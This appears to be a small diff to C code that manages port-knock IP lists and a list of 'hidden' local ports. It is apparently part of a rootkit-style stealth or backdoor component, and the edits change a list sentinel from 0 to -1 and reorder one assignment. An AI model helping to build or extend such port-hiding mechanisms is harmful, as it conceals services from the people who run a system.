@@ -45,7 +45,7 @@ knock_list_t ips_stage3 = {
 knock_list_t_ptr ips_stage3_tail = &ips_stage3;
 
 lport_list_t hidden_lports = {
-    .lport = 0,
+    .lport = -1,
     .prev = NULL,
     .next = NULL,
 };
@@ -88,8 +88,9 @@ clear_hidden_lports(void)
 {
     knock_list_t_ptr i;
 
-    i = ips_stage1_tail;
     ip_t no_ip = { 0 };
+
+    i = ips_stage1_tail;
     if (memcmp(i->ip, no_ip, (ip->version == v4 ? 4 : 16)))
         while ((i = remove_knock_from_list(i, &i, i->ip, i->version)));
 
@@ -149,7 +150,7 @@ remove_lport_from_list(lport_list_t_ptr list, lport_t lport)
 {
     lport_list_t_ptr i = find_lport_in_list(list, lport), ret = NULL;
 
-    if (i && (i->lport != 0)) {
+    if (i && (i->lport != -1)) {
         if (i->next)
             i->next->prev = i->prev;
         else
